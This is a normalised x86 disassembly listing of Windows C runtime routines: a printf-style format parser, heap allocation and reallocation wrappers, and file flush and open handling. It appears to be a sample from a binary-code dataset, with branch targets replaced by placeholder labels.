test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor ebx ebx
jmp r-xdata
inc esi
cmp [ ebp - 0x87c ] 0x0
mov [ ebp - 0x884 ] esi
jl r-xdata
mov eax [ ebp - 0x87c ]
mov eax [ ebp - 0x870 ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rwxdata ]
jmp r-xdata
cmp [ ebp - 0x864 ] 0x1
jne r-xdata
xor esi esi
cmp [ ebp - 0x8a4 ] esi
je r-xdata
lea eax [ ebx - 0x20 ]
cmp al 0x58
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
cmp [ ebp - 0x860 ] 0x1
jne r-xdata
cmp [ ebp - 0x8a4 ] 0x7
jne r-xdata
xor eax eax
movsx eax bl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
cmp [ ebp - 0x864 ] esi
jne r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
cmp [ ebp - 0x86c ] 0x0
jmp r-xdata
cmp eax 0x8
je r-xdata
cmp [ esi ] 0x25
je r-xdata
mov edx [ ebp - 0x8a4 ]
imul eax eax 0x9
movzx eax [ eax + edx + r--data ]
xor edi edi
shr eax 0x4
inc edi
xor ecx ecx
mov [ ebp - 0x8a4 ] eax
cmp eax edi
jne r-xdata
cmp [ ebp - 0x894 ] esi
jl r-xdata
je r-xdata
cmp eax 0x7
ja r-xdata
mov edx [ ebp - 0x880 ]
mov eax [ ebp - 0x8a4 ]
jmp [ eax * 4 + r-xdata ]
cmp [ ebp - 0x860 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x854 ]
lea eax [ ebp - 0x648 ]
mov esi [ ebp - 0x884 ]
mov al [ esi ]
mov [ ebp - 0x85c ] al
test al al
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x860 ] edi
jne r-xdata
push 0xa
lea eax [ ebp - 0x898 ]
push eax
push esi
call sub_41160c
add esp 0xc
test eax eax
jle r-xdata
mov [ eax ] edx
add edx 0x4
dec ecx
je r-xdata
mov bl [ ebp - 0x85c ]
push 0xa
lea eax [ ebp - 0x898 ]
push eax
push esi
call sub_41160c
mov ecx [ ebp - 0x898 ]
add esp 0xc
dec eax
cmp [ ebp - 0x864 ] 0x0
lea edx [ ecx + 0x1 ]
mov [ ebp - 0x880 ] eax
mov [ ebp - 0x884 ] edx
jne r-xdata
and [ ebp - 0x860 ] 0x0
xor ecx ecx
mov eax [ ebp - 0x898 ]
cmp [ eax ] 0x24
jne r-xdata
mov ecx [ eax - 0x4 ]
dec ecx
je r-xdata
dec ecx
je r-xdata
xor ecx ecx
mov esi edx
test eax eax
js r-xdata
cmp [ ebp - 0x864 ] 0x0
jne r-xdata
dec ecx
je r-xdata
cmp [ ecx ] 0x24
jne r-xdata
mov [ ebp - 0x860 ] edi
jmp r-xdata
push 0x640
lea eax [ ebp - 0x64c ]
push 0x0
push eax
call sub_4105f0
add esp 0xc
mov [ eax ] edx
add edx 0x8
jmp r-xdata
dec ecx
je r-xdata
cmp eax 0x64
jge r-xdata
inc esi
add eax 0x10
mov [ ebp - 0x854 ] edx
cmp esi [ ebp - 0x894 ]
jle r-xdata
dec ecx
je r-xdata
cmp eax [ ebp - 0x894 ]
jle r-xdata
dec ecx
dec ecx
jne r-xdata
mov [ ebp - 0x894 ] eax
sub_415d17
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_40d6cd
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_415d4a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_415d17
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_415d70
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_415d17
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_40d1fa
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_415d17
sub_415dbd
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x258 ] esi
mov [ ebp - 0x228 ] ebx
mov [ ebp - 0x260 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x238 ] eax
call sub_40d831
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
cmp [ ebp - 0x244 ] 0x0
je r-xdata
xor esi esi
cmp edi esi
je r-xdata
push esi
call sub_410551
pop ecx
mov edx rwxdata
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ edi ]
mov [ ebp - 0x224 ] esi
mov [ ebp - 0x220 ] esi
mov [ ebp - 0x240 ] esi
mov [ ebp - 0x254 ] esi
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
cmp [ ebp - 0x244 ] 0x0
je r-xdata
inc edi
mov [ ebp - 0x23c ] edi
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rwxdata ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x240 ] 0x0
je r-xdata
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x240 ] 0x7
jne r-xdata
xor eax eax
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rwxdata ]
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
mov ecx [ ebp - 0x240 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x240 ] eax
cmp eax esi
je r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov edi [ ebp - 0x23c ]
mov al [ edi ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + jump_table_41696d ]
mov ebx [ ebp - 0x228 ]
xor esi esi
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x218 ] 0xffffffff
mov [ ebp - 0x270 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x218 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x238 ] 0x0
lea eax [ ebp - 0x250 ]
push eax
movzx eax dl
push eax
call sub_4144f3
pop ecx
test eax eax
mov al [ ebp - 0x211 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x210 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x234 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x234 ] eax
jmp r-xdata
add ebx 0x4
mov [ ebp - 0x228 ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x234 ] ebx
test ebx ebx
jns r-xdata
mov eax [ ebp - 0x218 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
add ebx 0x4
mov [ ebp - 0x228 ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x218 ] ebx
test ebx ebx
jns r-xdata
mov al [ edi ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x258 ]
lea esi [ ebp - 0x224 ]
call sub_415d17
jmp r-xdata
mov ecx [ ebp - 0x258 ]
lea esi [ ebp - 0x224 ]
call sub_415d17
mov al [ edi ]
inc edi
mov [ ebp - 0x23c ] edi
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x210 ] 0x4
neg [ ebp - 0x234 ]
jmp r-xdata
or [ ebp - 0x218 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x210 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x210 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ edi + 0x1 ] 0x32
jne r-xdata
add edi 0x2
or [ ebp - 0x210 ] 0x8000
mov [ ebp - 0x23c ] edi
jmp r-xdata
cmp [ edi ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x218 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x218 ] esi
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add ebx esi
mov eax [ ebx - 0x8 ]
mov edx [ ebx - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
add edi 0x2
and [ ebp - 0x210 ] 0xffff7fff
mov [ ebp - 0x23c ] edi
jmp r-xdata
or [ ebp - 0x210 ] 0x10
jmp r-xdata
inc edi
or [ ebp - 0x210 ] 0x1000
mov [ ebp - 0x23c ] edi
jmp r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
add ebx 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x228 ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x21c ] ebx
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x220 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] 0x10
je r-xdata
cmp [ ebp - 0x25c ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add ebx 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x228 ] ebx
mov [ ebp - 0x260 ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x210 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x260 ] 0x27
mov ecx [ ebp - 0x210 ]
test ecx 0x8000
je r-xdata
mov al [ ebp - 0x260 ]
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x230 ] 0x2
jmp r-xdata
cmp [ ebp - 0x254 ] 0x0
je r-xdata
mov eax [ ebp - 0x210 ]
test al 0x40
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp [ ebp - 0x218 ] 0x0
lea edi [ ebp - 0x20c ]
mov eax 0x200
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x264 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ ebx - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x228 ] ebx
test cl 0x40
je r-xdata
test [ ebp - 0x210 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ ebx ]
add ebx 0x4
mov [ ebp - 0x228 ] ebx
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x210 ] 0x800
add dl 0x20
mov [ ebp - 0x270 ] 0x1
mov [ ebp - 0x211 ] dl
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x21c ]
jmp r-xdata
mov eax [ rwxdata ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp - 0x21c ]
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov eax [ rwxdata ]
mov [ ebp - 0x21c ] eax
push [ ebp - 0x254 ]
call sub_40b955
and [ ebp - 0x254 ] 0x0
pop ecx
mov ebx [ ebp - 0x234 ]
sub ebx [ ebp - 0x220 ]
sub ebx [ ebp - 0x230 ]
mov [ ebp - 0x264 ] ebx
test al 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x218 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ ebx - 0x4 ]
movsx eax [ ebx - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rwxdata ]
mov [ ebp - 0x21c ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
push [ ebp - 0x230 ]
mov edi [ ebp - 0x258 ]
lea eax [ ebp - 0x224 ]
lea ecx [ ebp - 0x22c ]
call sub_415d70
test [ ebp - 0x210 ] 0x8
pop ecx
je r-xdata
mov edi ebx
test ebx ebx
jle r-xdata
test al 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp [ ebp - 0x218 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
mov eax [ ebx ]
mov esi [ DecodePointer@IAT ]
add ebx 0x8
mov [ ebp - 0x278 ] eax
mov eax [ ebx - 0x4 ]
mov [ ebp - 0x274 ] eax
lea eax [ ebp - 0x250 ]
push eax
push [ ebp - 0x270 ]
movsx eax dl
push [ ebp - 0x218 ]
mov [ ebp - 0x228 ] ebx
push eax
push [ ebp - 0x264 ]
lea eax [ ebp - 0x278 ]
push edi
push eax
push [ rwxdata ]
call esi
call eax
mov ebx [ ebp - 0x210 ]
add esp 0x1c
and ebx 0x80
je r-xdata
mov esi [ ebx ]
add ebx 0x4
mov [ ebp - 0x228 ] ebx
call sub_40c28b
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x210 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x218 ] eax
jle r-xdata
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x210 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x220 ] eax
test [ ebp - 0x210 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x21c ] ecx
je r-xdata
add ebx 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x228 ] ebx
je r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x238 ] 0x0
mov ebx [ ebp - 0x220 ]
je r-xdata
test [ ebp - 0x210 ] 0x4
jne r-xdata
mov ecx [ ebp - 0x258 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_415d17
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
test al 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x230 ] 0x1
cmp [ ebp - 0x218 ] 0xa3
jle r-xdata
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
test [ ebp - 0x210 ] 0x20
je r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] esi
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x218 ] eax
and [ ebp - 0x238 ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov al [ ebx - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x220 ] 0x1
movzx eax [ ebx - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x220 ]
push eax
call sub_414453
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x240 ] 0x0
inc eax
add eax 0x2
mov ecx [ ebp - 0x21c ]
push ebx
lea eax [ ebp - 0x224 ]
call sub_415d70
pop ecx
test ebx ebx
jle r-xdata
jmp r-xdata
test edi edi
jg r-xdata
mov [ ebp - 0x22c ] 0x20
mov esi [ ebp - 0x218 ]
add esi 0x15d
push esi
call sub_40eec5
mov dl [ ebp - 0x211 ]
pop ecx
mov [ ebp - 0x254 ] eax
test eax eax
je r-xdata
cmp [ edi ] 0x2d
jne r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x250 ]
push eax
push edi
push [ rwxdata ]
call esi
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x224 ]
mov [ esi ] eax
mov ax [ ebp - 0x224 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x210 ] 0x200
jmp r-xdata
lea esi [ ebp - 0xd ]
and [ ebp - 0x230 ] eax
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x21c ] eax
jmp r-xdata
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
test [ ebp - 0x210 ] 0x4
je r-xdata
mov esi [ ebp - 0x21c ]
test ebx ebx
jg r-xdata
mov [ ebp - 0x218 ] 0xa3
mov [ ebp - 0x21c ] eax
mov [ ebp - 0x264 ] esi
mov edi eax
jmp r-xdata
push edi
jmp r-xdata
or [ ebp - 0x210 ] 0x100
inc edi
mov [ ebp - 0x21c ] edi
lea eax [ ebp - 0x250 ]
push eax
push edi
push [ rwxdata ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x220 ]
cdq
push edx
push eax
push ebx
push edi
call sub_4147b0
add ecx 0x30
mov [ ebp - 0x264 ] ebx
mov edi eax
mov ebx edx
cmp ecx 0x39
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
mov ebx [ ebp - 0x264 ]
jmp r-xdata
or [ ebp - 0x224 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x26c ] eax
je r-xdata
lea esi [ ebp - 0x224 ]
mov ecx edi
mov al 0x30
dec ebx
call sub_415d17
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
call sub_413290
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x260 ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
test [ ebp - 0x210 ] 0x200
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x21c ] esi
je r-xdata
test ebx ebx
jg r-xdata
cmp [ ebp - 0x224 ] 0x0
jl r-xdata
push [ ebp - 0x26c ]
lea eax [ ebp - 0x224 ]
lea ecx [ ebp - 0xc ]
call sub_415d70
pop ecx
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x218 ]
dec [ ebp - 0x218 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
lea esi [ ebp - 0x224 ]
mov ecx edi
mov al 0x20
dec ebx
call sub_415d17
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
movzx eax [ esi ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x26c ]
push eax
dec ebx
add esi 0x2
call sub_414453
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x21c ]
mov ecx [ ebp - 0x21c ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_41698d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_40d1fa
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rwxdata ] 0x0
je r-xdata
push esi
push 0x8
push [ rwxdata ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_40d592
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_416a0f
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_40b9ce
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_40b955
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_40d592
pop ecx
call sub_40d1fa
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rwxdata ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rwxdata ] eax
je r-xdata
pop edi
call sub_40d1fa
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40d1b8
pop ecx
mov [ esi ] eax
push esi
call sub_40d592
pop ecx
test eax eax
je r-xdata
call sub_40d1fa
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_40d1b8
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_416abc
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_416a0f
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_419407
pop ecx
mov ebx eax
call sub_40d1fa
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_4105f0
add esp 0xc
sub_416b2a
push 0x10
push r--data
call sub_40f510
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_40d1fa
mov [ eax ] 0x9
call sub_40d1fa
mov [ eax ] 0x9
call sub_40e72d
jmp r-xdata
cmp ebx [ rwxdata ]
jb r-xdata
call sub_40f555
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rwxdata ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_417b27
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_40d1fa
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_417abe
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416bfb
mov eax [ ebp - 0x1c ]
call sub_40d20d
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_416c03
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
mov esi eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x2c ] ebx
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40e6c1
int3
mov eax 0x8000
test [ ebp + 0x10 ] eax
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_41b801
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
and eax 0x3
sub eax ebx
mov ecx 0xc0000000
mov edx 0x80000000
je r-xdata
test [ ebp + 0x10 ] 0x74000
jne r-xdata
mov [ ebp - 0xc ] edx
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x24 ] eax
je r-xdata
mov [ ebp - 0x14 ] ebx
sub eax ecx
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
test [ ebp + 0x10 ] 0x70000
jne r-xdata
mov [ ebp - 0xc ] ecx
jmp r-xdata
call sub_40d20d
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_40d1fa
push 0x16
pop esi
mov [ eax ] esi
call sub_40e72d
mov eax esi
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x18 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
push edi
mov edi 0x100
cmp eax ecx
jg r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
pop esi
pop ebx
leave
retn
test al 0x40
je r-xdata
mov ecx [ rwxdata ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x18 ] 0x5
jmp r-xdata
cmp eax edx
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
test eax 0x1000
je r-xdata
or [ ebp - 0x10 ] 0x4000000
or [ ebp - 0xc ] 0x10000
or [ ebp - 0x14 ] 0x4
mov [ ebp - 0x10 ] 0x1
call sub_40d20d
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_40d1fa
push 0x16
pop esi
mov [ eax ] esi
call sub_40e72d
mov eax esi
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0xc ] edx
sete al
mov [ ebp - 0x14 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0x10 ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0x10 ] 0x8000000
jmp r-xdata
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
call sub_417bed
or ebx 0xffffffff
mov [ esi ] eax
cmp eax ebx
jne r-xdata
or [ ebp - 0x10 ] 0x10000000
mov eax [ ebp + 0x8 ]
